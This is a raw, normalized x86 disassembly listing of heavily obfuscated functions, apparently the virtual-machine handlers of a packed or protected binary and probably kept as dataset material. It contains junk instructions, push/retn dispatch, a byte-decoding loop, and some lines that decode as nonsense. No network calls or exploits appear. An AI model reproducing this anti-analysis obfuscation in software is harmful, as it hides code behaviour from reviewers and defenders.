sub_1020d3e4
mov esi [ esp + 0xc ]
pushfd
pushad
lea esp [ esp + 0x34 ]
jmp rwxdata
pushad
jmp rwxdata
pushfd
pushfd
lea esp [ esp + 0x28 ]
call j_sub_101cb5d7
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
pushad
mov [ esp + 0x10 ] 0x9e
lodsb [ esi ]
rcl bl cl
sub al 0xf8
not bl
setge bl
ror al 0x1
not bl
setno bl
not al
dec bl
shr bl cl
xor al 0xbe
sbb bl dh
push [ esp ]
ror bl cl
jmp rwxdata
cmc
stc
bt ecx ebp
jmp rwxdata
neg al
not bl
pushfd
setne bl
mov bl ah
stosb [ edi ]
jmp rwxdata
xor ecx ecx
jmp rwxdata
push 0xd9d35aa3
mov bl 0x2
lea esp [ esp + 0x2c ]
jmp rwxdata
call j_sub_101cb5d7
jmp j_sub_101d1d2f
sub_1020d425
push eax
pushfd
lea esp [ esp + 0x18 ]
jae rwxdata
pushfd
inc bl
inc ecx
sub esp 0xfffffffc
not bl
shl bl 0x4
shl bl 0x3
xchg ebp eax
clc
movsx ax al
mov eax ebp
neg bl
mov bl 0x1
pushfd
jmp rwxdata
clc
bt di 0xa
cmp eax 0x7f
jmp rwxdata
cmp dh 0xab
xchg [ esp ] esi
pushad
ror si cl
btc esi esp
mov esi edi
stc
call sub_101d929d
test bl dh
call sub_101be430
cli
push esi
sub [ edx ] cl
xor al 0x7f
pushad
mov eax [ 0x5e0a74cc ]
0xa151a44 0x1ee7
call sub_1020cbec
sub_1020d568
mov [ esp ] 0x14
lea esp [ esp + 0xc ]
jae rwxdata
jge rwxdata
push 0xe83c20fb
mov ebx eax
mov [ esp ] 0x42c4
pushad
mov edi eax
movzx ecx dl
pushad
jmp rwxdata
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
mov ecx 0x104
mov [ esp + 0x4 ] 0xa10758d3
mov [ esp ] 0xb5
mov [ esp + 0x4 ] si
lea esp [ esp + 0x44 ]
jmp rwxdata
cmp si ax
clc
xor al al
jmp sub_101d03b0
sub_1020d92a
test edi edi
push [ esp + 0x4 ]
pushad
push edx
lea esp [ esp + 0x40 ]
je rwxdata
bts dx 0x2
xor eax eax
jge rwxdata
cmp ebx 0xc61fc065
pushad
add eax edi
pushad
test ch cl
cmp eax edx
call sub_101bc774
cmp ebx 0xfe0
pushfd
call sub_1020f833
mov dh dl
jmp sub_101bdeb6
mov dl 0x4f
pop edx
xchg si di
pop ebx
xchg di si
mov si sp
push edi
call sub_101bba70
sub_1020d9ba
cmp cl 0x76
xor al [ edx ]
push edi
jmp rwxdata
jmp rwxdata
mov [ esp + 0x4 ] di
inc edx
pushfd
pushfd
dec [ ebp ]
push 0xfcff6c51
pushad
call sub_1020f0c0
sub_1020dac1
push 0x3a7e193
ror esi 0x10
lea ebp [ ebx - 0x2f18a944 ]
pop ebp
dec esi
pushad
rol bp cl
xor esi 0xda89bbcd
or bh bl
bswap bp
lea ebp [ esp + 0x24 ]
shr bx cl
call sub_1020ea2b
sub_1020dbc3
lea esi [ esi - 0x1 ]
lea esp [ esp + 0x28 ]
jo rwxdata
bts dx 0x5
sub bl al
call sub_1020ea4c
pushad
pushfd
pop [ esp + 0x28 ]
call sub_1020e3f9
rol dh cl
sub bl al
call sub_1020ef6c
xchg al ah
pushfd
clc
bt esp ebx
xor ax bx
jmp sub_1020e306
sub_1020dcd3
mov [ ebp ] ax
pushad
pushfd
push 0x645639d6
pushfd
lea esp [ esp + 0x40 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020dbc3
sub_1020ded6
mov esp eax
pushad
pushfd
pop [ esp + 0x1c ]
bswap di
mov [ esp + 0x18 ] esi
bswap edi
pushad
mov esi edx
lea edi [ esi + 0x4501885d ]
lea edi [ edx * 8 - 0x833b192 ]
jmp rwxdata
lea edi [ ecx + eax - 0x40 ]
push [ esp + 0xc ]
pushfd
mov [ esp + 0x3c ] edi
mov edi [ esp ]
std
bswap di
bswap di
mov edi eax
mov [ esp + 0x4 ] 0x2a
jmp rwxdata
cld
push 0x2d3807c7
push ebp
jmp rwxdata
pushfd
[ edi ] [ esi ]
bswap si
rol esi cl
neg di
cld
mov edi [ esp + 0x48 ]
pop esi
shl si cl
std
pop esi
mov esi [ esp + 0x44 ]
stc
mov [ esp ] 0xc
call sub_1020f508
sub_1020df21
test dl 0x99
shl eax 0x7
cmp ah bl
cmp ah bh
bt dx di
shr ecx 0x19
bt bp bp
clc
bt di 0x1
cmc
or eax ecx
cmc
jmp sub_1020d9ba
sub_1020e088
mov ebx [ esp + 0x4 ]
push esi
pushad
mov [ esp ] edx
lea esp [ esp + 0x2c ]
jmp rwxdata
sbb ax 0x9f3
lea eax [ edi + 0x50 ]
cmp di sp
cmp ebp eax
jmp rwxdata
push edi
pushfd
lea esp [ esp + 0x8 ]
ja rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020dbc3
sub dh dl
mov edx esp
cwde
shrd ecx esp 0x13
shrd ecx ecx 0xb
lea ecx [ edi + 0x40 ]
lea eax [ ebp * 4 + 0x25a0af5c ]
jmp rwxdata
das
cwde
sub ecx edx
bsr ax bx
and ah ch
clc
ror edi cl
lea eax [ ebp - 0x80 ]
jmp rwxdata
not di
and al 0xfc
not di
stc
dec di
dec di
sub eax ecx
jmp rwxdata
call sub_1020ded6
sub_1020e2ef
push [ esp + 0x2c ]
pop [ ebp ]
mov [ esp ] 0x712
pushfd
lea esp [ esp + 0x34 ]
jmp rwxdata
sbb ax 0x9f3
lea eax [ edi + 0x50 ]
cmp di sp
cmp ebp eax
jmp rwxdata
push edi
pushfd
lea esp [ esp + 0x8 ]
ja rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020dbc3
sub dh dl
mov edx esp
cwde
shrd ecx esp 0x13
shrd ecx ecx 0xb
lea ecx [ edi + 0x40 ]
lea eax [ ebp * 4 + 0x25a0af5c ]
jmp rwxdata
das
cwde
sub ecx edx
bsr ax bx
and ah ch
clc
ror edi cl
lea eax [ ebp - 0x80 ]
jmp rwxdata
not di
and al 0xfc
not di
stc
dec di
dec di
sub eax ecx
jmp rwxdata
call sub_1020ded6
sub_1020e306
stc
clc
ror ax 0xd
stc
sub esp 0xfffffffc
jae rwxdata
cmp cl bh
xor ax 0x953c
test di bx
lea esi [ esi - 0x2 ]
pushad
bt cx 0x5
not ax
pushad
xor bx ax
mov [ esp + 0xc ] al
bt ax 0xb
push 0xc378dadb
sub ebp 0x2
call sub_1020f6eb
xor ax 0x953c
test ch 0xd
pushad
stc
lea esi [ esi - 0x2 ]
mov [ esp + 0x8 ] bh
not ax
stc
clc
bt sp bx
xor bx ax
pushfd
call sub_1020ecbc
sub_1020e405
lea esp [ esp + 0x54 ]
jg rwxdata
pushad
pushad
push [ esp + 0x40 ]
pop [ ebp ]
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x44 ]
jmp rwxdata
push 0x6a190e72
push [ esp + 0x4 ]
pop [ ebp ]
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
sbb ax 0x9f3
lea eax [ edi + 0x50 ]
cmp di sp
cmp ebp eax
jmp rwxdata
push edi
pushfd
lea esp [ esp + 0x8 ]
ja rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020dbc3
sub dh dl
mov edx esp
cwde
shrd ecx esp 0x13
shrd ecx ecx 0xb
lea ecx [ edi + 0x40 ]
lea eax [ ebp * 4 + 0x25a0af5c ]
jmp rwxdata
das
cwde
sub ecx edx
bsr ax bx
and ah ch
clc
ror edi cl
lea eax [ ebp - 0x80 ]
jmp rwxdata
not di
and al 0xfc
not di
stc
dec di
dec di
sub eax ecx
jmp rwxdata
call sub_1020ded6
sub_1020e8df
push [ esp + 0x40 ]
pop [ ebp ]
push [ esp + 0x4 ]
lea esp [ esp + 0x48 ]
jmp rwxdata
sbb ax 0x9f3
lea eax [ edi + 0x50 ]
cmp di sp
cmp ebp eax
jmp rwxdata
push edi
pushfd
lea esp [ esp + 0x8 ]
ja rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020dbc3
sub dh dl
mov edx esp
cwde
shrd ecx esp 0x13
shrd ecx ecx 0xb
lea ecx [ edi + 0x40 ]
lea eax [ ebp * 4 + 0x25a0af5c ]
jmp rwxdata
das
cwde
sub ecx edx
bsr ax bx
and ah ch
clc
ror edi cl
lea eax [ ebp - 0x80 ]
jmp rwxdata
not di
and al 0xfc
not di
stc
dec di
dec di
sub eax ecx
jmp rwxdata
call sub_1020ded6
sub_1020e92d
mov [ esp ] esp
dec esi
push ebp
mov [ esp ] 0x6f
push 0x29b0ed31
push 0xc7280666
lea esp [ esp + 0x38 ]
jmp rwxdata
sbb ax 0x9f3
lea eax [ edi + 0x50 ]
cmp di sp
cmp ebp eax
jmp rwxdata
push edi
pushfd
lea esp [ esp + 0x8 ]
ja rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020dbc3
sub dh dl
mov edx esp
cwde
shrd ecx esp 0x13
shrd ecx ecx 0xb
lea ecx [ edi + 0x40 ]
lea eax [ ebp * 4 + 0x25a0af5c ]
jmp rwxdata
das
cwde
sub ecx edx
bsr ax bx
and ah ch
clc
ror edi cl
lea eax [ ebp - 0x80 ]
jmp rwxdata
not di
and al 0xfc
not di
stc
dec di
dec di
sub eax ecx
jmp rwxdata
call sub_1020ded6
sub_1020e994
cmc
sub ebp 0x2
bt bp 0x3
push 0x667f09fc
shr eax cl
mov [ esp ] 0x4dd2
mov [ esp ] bl
push 0xc73fd950
mov [ ebp + 0x4 ] eax
jmp rwxdata
pushfd
pop [ esp + 0x8 ]
jmp rwxdata
push 0x6d6bf94a
jmp rwxdata
push [ esp + 0xc ]
pop [ ebp ]
mov [ esp + 0x8 ] al
mov [ esp ] bl
pushad
push [ esp + 0x4 ]
lea esp [ esp + 0x34 ]
jmp rwxdata
sbb ax 0x9f3
lea eax [ edi + 0x50 ]
cmp di sp
cmp ebp eax
jmp rwxdata
push edi
pushfd
lea esp [ esp + 0x8 ]
ja rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020dbc3
sub dh dl
mov edx esp
cwde
shrd ecx esp 0x13
shrd ecx ecx 0xb
lea ecx [ edi + 0x40 ]
lea eax [ ebp * 4 + 0x25a0af5c ]
jmp rwxdata
das
cwde
sub ecx edx
bsr ax bx
and ah ch
clc
ror edi cl
lea eax [ ebp - 0x80 ]
jmp rwxdata
not di
and al 0xfc
not di
stc
dec di
dec di
sub eax ecx
jmp rwxdata
call sub_1020ded6
sub_1020ea2b
ror bl cl
neg di
sub esp 0x98
shl al 0x2
adc al dl
xor di si
shl edi 0x1
mov edi esp
pushad
test dh bh
dec bl
jmp rwxdata
mov ebx esi
sbb al cl
bsr edx eax
add esi [ ebp ]
add esp 0x20
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020dbc3
sub_1020ea4c
setns dh
movzx eax al
pushad
mov edx [ eax * 4 + rwxdata ]
bt sp sp
rol edx 0x13
test bh ah
add edx 0x0
pushad
mov [ esp ] dx
mov [ esp + 0x40 ] edx
mov [ esp + 0x4 ] al
mov [ esp ] eax
push edi
push [ esp + 0x44 ]
retn 0x48
sub_1020ef6c
rol dh cl
movzx eax al
setle dh
btr dx 0x1
mov edx [ eax * 4 + rwxdata ]
push 0x652cd922
cmc
rol edx 0x13
cmp dl 0x3e
sub esp 0xfffffff8
jg rwxdata
pushfd
push 0x35031213
add edx 0x0
mov [ esp + 0x4 ] ah
call j_sub_1020f863
jmp rwxdata
push 0x71caeb6e
add edx 0x0
jmp sub_1020ddef
mov [ esp + 0x4 ] bx
push [ esp ]
mov [ ebp + 0x4 ] ax
push ebx
push [ esp + 0x4 ]
pushfd
pop [ esp + 0x4c ]
push 0xd4ded92a
call sub_1020e405
sub_1020f2dc
mov [ esp + 0x8 ] 0xb8
mov [ ebp ] ax
mov [ esp ] 0x2aae
mov [ esp + 0x4 ] 0x3ff0c1f2
push [ esp ]
push [ esp ]
lea esp [ esp + 0x18 ]
jmp rwxdata
sbb ax 0x9f3
lea eax [ edi + 0x50 ]
cmp di sp
cmp ebp eax
jmp rwxdata
push edi
pushfd
lea esp [ esp + 0x8 ]
ja rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020dbc3
sub dh dl
mov edx esp
cwde
shrd ecx esp 0x13
shrd ecx ecx 0xb
lea ecx [ edi + 0x40 ]
lea eax [ ebp * 4 + 0x25a0af5c ]
jmp rwxdata
das
cwde
sub ecx edx
bsr ax bx
and ah ch
clc
ror edi cl
lea eax [ ebp - 0x80 ]
jmp rwxdata
not di
and al 0xfc
not di
stc
dec di
dec di
sub eax ecx
jmp rwxdata
call sub_1020ded6
sub_1020f3c5
mov [ ebp ] eax
mov [ esp ] 0x7f88
mov [ esp + 0x4 ] ah
pushfd
lea esp [ esp + 0x28 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020dbc3
sub_1020f508
push [ esp + 0x4c ]
popfd
mov [ esp ] 0xbc
mov [ esp + 0x4 ] 0xdf
mov [ esp ] bl
lea esp [ esp + 0x50 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020dbc3
sub_1020f68e
mov [ esp ] si
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x8 ] sp
push [ esp + 0x1c ]
pop [ ebp ]
push [ esp + 0x4 ]
pushfd
mov [ esp ] dh
lea esp [ esp + 0x28 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020dbc3
sub_1020f6eb
pushfd
push [ esp ]
jmp rwxdata
mov [ ebp ] ax
mov [ esp + 0x4 ] si
mov [ esp ] 0xc7a8
mov [ esp ] di
lea esp [ esp + 0x50 ]
jmp rwxdata
sbb ax 0x9f3
lea eax [ edi + 0x50 ]
cmp di sp
cmp ebp eax
jmp rwxdata
push edi
pushfd
lea esp [ esp + 0x8 ]
ja rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020dbc3
sub dh dl
mov edx esp
cwde
shrd ecx esp 0x13
shrd ecx ecx 0xb
lea ecx [ edi + 0x40 ]
lea eax [ ebp * 4 + 0x25a0af5c ]
jmp rwxdata
das
cwde
sub ecx edx
bsr ax bx
and ah ch
clc
ror edi cl
lea eax [ ebp - 0x80 ]
jmp rwxdata
not di
and al 0xfc
not di
stc
dec di
dec di
sub eax ecx
jmp rwxdata
call sub_1020ded6
sub_1020f73d
push ecx
btr si bx
push 0x59f5add0
btr si dx
mov [ esp ] ebx
movzx dx cl
push edi
jmp rwxdata
pushfd
mov [ esp ] eax
bt si di
rol si cl
xchg bp si
push ebx
movsx bx cl
bswap di
push 0xd9734d72
push [ rwxdata ]
pop [ esp ]
btr edi edi
xchg esi edi
stc
push 0x0
not bl
rcr si cl
rcr ebp 0x1
rcl bp 0xa
mov esi [ esp + 0x30 ]
mov di sp
call sub_1020dac1
sub_1020f7d5
mov [ ss : eax ] dx
pushfd
mov [ esp ] 0x45
pushfd
mov [ esp ] ch
lea esp [ esp + 0x18 ]
jmp rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020dbc3
sub_1020f81a
mov [ esp + 0x4 ] dh
mov [ ebp ] ax
push ebx
pushfd
mov [ esp + 0x8 ] 0xe3
pushfd
lea esp [ esp + 0x34 ]
jmp rwxdata
sbb ax 0x9f3
lea eax [ edi + 0x50 ]
cmp di sp
cmp ebp eax
jmp rwxdata
push edi
pushfd
lea esp [ esp + 0x8 ]
ja rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020dbc3
sub dh dl
mov edx esp
cwde
shrd ecx esp 0x13
shrd ecx ecx 0xb
lea ecx [ edi + 0x40 ]
lea eax [ ebp * 4 + 0x25a0af5c ]
jmp rwxdata
das
cwde
sub ecx edx
bsr ax bx
and ah ch
clc
ror edi cl
lea eax [ ebp - 0x80 ]
jmp rwxdata
not di
and al 0xfc
not di
stc
dec di
dec di
sub eax ecx
jmp rwxdata
call sub_1020ded6
sub_1020f833
lea esp [ esp + 0x28 ]
jne rwxdata
not bh
movzx bx bl
call sub_1020e088
bswap bx
ror bl cl
xor [ ebp + 0xc ] 0x20
movsx bx al
movsx bx dl
pop ebx
push 0xf593dac4
push edx
push 0x8241305a
lea esp [ esp + 0xc ]
jmp rwxdata
sbb ax 0x9f3
lea eax [ edi + 0x50 ]
cmp di sp
cmp ebp eax
jmp rwxdata
push edi
pushfd
lea esp [ esp + 0x8 ]
ja rwxdata
shrd dx bx 0xd
cmp dl dl
bswap dx
shl al 0x1
mov al [ esi - 0x1 ]
pushad
shrd dx sp cl
sub al bl
bswap edx
not al
adc dx bx
ror edx cl
shl dx cl
bts dx 0x2
neg al
push [ esp ]
cmp ch 0x77
shrd dx bp 0xd
xor al 0x7f
call sub_1020dbc3
sub dh dl
mov edx esp
cwde
shrd ecx esp 0x13
shrd ecx ecx 0xb
lea ecx [ edi + 0x40 ]
lea eax [ ebp * 4 + 0x25a0af5c ]
jmp rwxdata
das
cwde
sub ecx edx
bsr ax bx
and ah ch
clc
ror edi cl
lea eax [ ebp - 0x80 ]
jmp rwxdata
not di
and al 0xfc
not di
stc
dec di
dec di
sub eax ecx
jmp rwxdata
call sub_1020ded6
sub_10115428
mov [ esp + 0x8 ] 0x3e24
adc al al
jmp sub_101d7a36
sub_10115a26
call sub_101d8c73
and al 0xe4
pop edx
imul esi [ esi - 0x32 ] 0x30a6bfbf
pop ss
imul esi esi 0x6f5690a
and edi [ edi + esi * 8 ]
dec esp
in al 0x86
jmp 0x1a156c36
sub_10115dfb
pushfd
call sub_101bcc02
sub_10115e16
pushfd
mov [ esp + 0x4 ] cl
mov [ esp ] 0x43a55e02
mov [ esp + 0x3c ] eax
mov [ esp + 0x4 ] 0x34
push [ esp + 0x3c ]
retn 0x40
sub_101b8064
push [ eax ]
pop [ esp + 0x38 ]
pushfd
pushfd
push [ esp + 0x10 ]
push edi
push [ esp + 0x48 ]
retn 0x4c
sub_101b815f
ror al 0x1
test ah dh
stc
call sub_101bdfaf
iretd
j_sub_101ca144
jmp sub_101ca144
j_sub_1020a28e
jmp sub_1020a28e
j_sub_101bc751
jmp sub_101bc751
sub_101bb312
lea eax [ rwxdata ]
jmp sub_101c8fde
sub_101bb96c
cmc
test al al
call sub_101d7250
sub_101bb974
mov [ esp + 0x44 ] 0xf250cba5
pushfd
pushfd
pushfd
lea esp [ esp + 0x50 ]
jmp rwxdata
call sub_1020f299
j_sub_101cee15
jmp sub_101cee15
sub_101bba70
mov edi [ esp + 0x8 ]
not si
call sub_1020a864
sub_101bc9c8
mov ebp [ esp + 0x4 ]
push [ esp + 0x4 ]
mov [ esp + 0x4 ] al
pushad
mov [ esp + 0x8 ] 0xddd
push [ esp + 0x2c ]
retn 0x40
sub_101bd302
pushfd
mov [ esp + 0x10 ] eax
pushad
push 0xf1351311
mov [ esp + 0xc ] ah
push [ esp + 0x34 ]
retn 0x38
sub_101bd8b9
call sub_101cb22f
sub_101be20e
call sub_1020d568
sub_101be430
pushfd
sub esi eax
mov [ esp + 0x4 ] ch
[ edi ] [ esi ]
call sub_1020d3e4
j_sub_101159bb
jmp sub_101159bb
sub_101bf312
and ebx 0xfff
pushad
jmp rwxdata
jmp sub_101d835e
sub_101bfa09
call sub_10115a26
call j_sub_101cb5d7
jmp j_sub_101d1d2f
sub_101c0665
push rwxdata
jmp rwxdata
push 0x810d562a
pushad
mov [ esp + 0x20 ] eax
pushad
pushfd
push 0x2f80dc6
push [ esp + 0x48 ]
retn 0x4c
sub_101c578b
or ecx ecx
push edi
call sub_101bfc5a
sub_101c58af
call sub_101ca480
sub_101c58b4
call sub_101c6a4b
sub_101c6455
adc ecx ecx
pushad
push 0x25fd3ecb
jmp rwxdata
lea esp [ esp + 0x28 ]
call j_sub_101cb5d7
pushfd
call sub_101ce9f0
sub_101c67a8
push 0x5105e3a2
mov [ esp + 0x38 ] rwxdata
call sub_10115e16
mov ebx 0xed18d925
dec ecx
xor eax 0xb68c5246
sub_101c686c
mov [ ebp - 0x4 ] eax
push [ esp + 0x8 ]
pushad
mov [ esp ] 0x425bfaaf
push edi
xchg [ esp + 0x30 ] eax
setno ah
mov [ esp + 0x2c ] 0x0
bswap ax
call sub_101baf81
sub_101c78f7
cmc
push ebp
call sub_101bdcbd
std
or esi [ ebx ]
sub_101c8658
mov [ esp + 0x8 ] 0x6f9f88
mov [ esp ] dl
pushfd
mov [ esp + 0x8 ] dh
lea esp [ esp + 0xc ]
jmp rwxdata
push 0x91552ce4
push [ esp ]
mov [ esp + 0x4 ] edx
lea esp [ esp + 0x4 ]
sub_101c874b
call sub_101b8064
push eax
sub_101c8c32
push [ eax ]
pop [ esp + 0x4 ]
mov [ esp ] dl
push ebx
pushad
push [ esp + 0x28 ]
retn 0x2c
sub_101c8c44
stc
not al
cmc
cmc
jmp sub_101d4cca
sub_101c8fde
push ecx
call sub_101ca793
pop ss
adc eax 0x7d39e649
loop rwxdata
cmp [ bp + si - 0x7e1 ] bl
shl [ edi - 0x1e ] 0x1
sbb al 0x62
pop esp
fisub [ ebp + ecx * 8 + 0x385de271 ]

sub_101c938c
add edi eax
call sub_101c9b7e
sub_101c99e8
mov ebp [ esp + 0x40 ]
push [ esp ]
mov [ esp + 0x4 ] 0x39
push ebx
pushfd
push [ esp + 0x50 ]
retn 0x5c
sub_101c9b7e
bt ebp edx
mov edi [ edi + ecx * 4 ]
push [ esp + 0x4 ]
push [ esp ]
stc
call sub_1020d92a
hlt
sub_101ca480
adc dl dl
lea esp [ esp + 0x50 ]
pushad
push [ esp ]
push [ esp + 0x24 ]
jpe rwxdata
pushfd
push 0xa3aa557c
push [ esp + 0x8 ]
retn 0x34
retn 0x28
sub_101ca702
mov [ esp + 0x24 ] eax
pushad
pushfd
pushfd
push [ esp + 0x4c ]
retn 0x50
sub_101cb22f
mov [ esp ] 0x4375ca92
jmp sub_1020d319
sub_101cb500
mov ecx [ esi + 0x4 ]
jmp sub_1020a442
sub_101cb9fd
call sub_101bb974
sub_101ce9dc
pushfd
push 0x1c9a2d0b
mov [ esp + 0x2c ] rwxdata
pushfd
call sub_101c857a
sub_101ce9f0
mov [ esp + 0x4 ] bp
lea esp [ esp + 0x8 ]
jb rwxdata
jmp sub_101cf4a6
pushad
pushfd
push [ esp + 0x24 ]
retn 0x28
sub_101cf47c
call sub_1020cfff
sub_101cf82f
test bp 0x46fc
neg al
clc
add al 0x2b
jmp sub_101bd980
_start
jmp sub_101bd8b9
sub_101d19e7
mov [ esp + 0x4 ] 0x6e77
bt ebp 0xf
clc
not al
cmc
stc
xor al 0xbe
jmp sub_101cb88c
j_sub_101cabb2
jmp sub_101cabb2
sub_101d1f12
mov [ esp ] 0x19fc7f78
pushfd
mov [ esp ] 0xef96
lea esp [ esp + 0x4 ]
jmp j_sub_1020f431
sub_101d2719
cmp eax [ ebp - 0x10 ]
jmp sub_101d3634
sub_101d32df
jns rwxdata
pushad
pushad
push [ esp + 0x8 ]
inc ecx
push 0x4621f482
call sub_101bc325
pushfd
inc ecx
lea esp [ esp + 0x4 ]
jmp sub_101cf4a6
j_sub_101d8cff
cmc
jmp sub_101d8cff
j_sub_101d2247
jmp sub_101d2247
sub_101d4cca
xor al 0xbe
clc
bt cx 0xf
clc
neg al
mov [ esp ] 0x6309
call j_sub_101d60a8
sub_101d4da9
mov esp ebp
pushad
mov ebp [ esp + 0x20 ]
pushfd
pushfd
push [ esp + 0x2c ]
retn 0x34
j_sub_101d1d2f
jmp sub_101d1d2f
j_sub_101d60a8
jmp sub_101d60a8
sub_101d52df
push 0x97317cf7
mov esi [ ebp + 0xc ]
lea esp [ esp + 0x4 ]
push eax
mov [ esp ] eax
call sub_101d12b7
sub_101d52f4
mov [ esp + 0x34 ] rwxdata
mov [ esp + 0x4 ] dl
pushfd
pushfd
jmp rwxdata
push [ eax ]
pop [ esp + 0x38 ]
push edx
mov [ esp ] ax
push [ esp + 0x3c ]
retn 0x40
sub_101d5936
movzx ebp al
mov ebp [ esp + 0x4 ]
pushad
push eax
mov [ esp + 0x8 ] 0x16
push 0x72754fda
push [ esp + 0x30 ]
retn 0x3c
sub_101d60a8
pushfd
lea esp [ esp + 0x48 ]
call sub_1020c707
call sub_101c59be
std
0x673b
sub_101d6177
mov bx [ esi ]
jmp sub_101e4f8c
sub_101d6693
mov [ esp ] di
mov [ esp ] 0x45
jmp sub_101c6455
sub_101d6995
push [ esp + 0x4 ]
jmp rwxdata
mov [ esp + 0x20 ] 0xc49b81c2
mov [ esp + 0xc ] 0x7c
push ebx
lea esp [ esp + 0x24 ]
jmp rwxdata
call sub_1020eecf
sub_101d723d
bt cx 0xd
add eax edi
clc
push eax
pushfd
clc
cmp eax edx
pushad
call sub_10115228
sub_101d7250
call sub_101d8858
j_sub_101bf312
jmp sub_101bf312
sub_101d77b0
call sub_101c686c
jmp sub_101d52df
sub_101d77ba
test bh 0x26
mov ah al
clc
call sub_101e4617
sub_101d7b15
mov [ esp + 0x8 ] 0xa5134a87
push 0xb8f7a8e9
pushad
lea esp [ esp + 0x2c ]
jmp j_sub_1020f20a
sub_101d835e
bt di bp
add [ ebx + edi ] edx
sub esp 0xffffffdc
sub_101d83a2
mov edi [ esp + 0x28 ]
call sub_101d965b
not [ edi + 0x8 ]
push edx
dec esp
salc
jmp 0xffffffffbc52d30e
sub_101d869e
pushad
mov [ esp + 0x4 ] cl
call sub_101c99d9
popfd
sti
retn
sub_101d8cff
call sub_101b815f
push 0xb84f5d36
call sub_101cf242
sub_101d8f6f
mov [ edi - 0x1 ] 0x0
not ah
mov [ esp ] ebx
not eax
lea eax [ rwxdata ]
jmp sub_101c0665
sub_101d91e6
or ebx ebx
call sub_101bd9d4
mov [ esp ] 0x2fd1f842
pushad
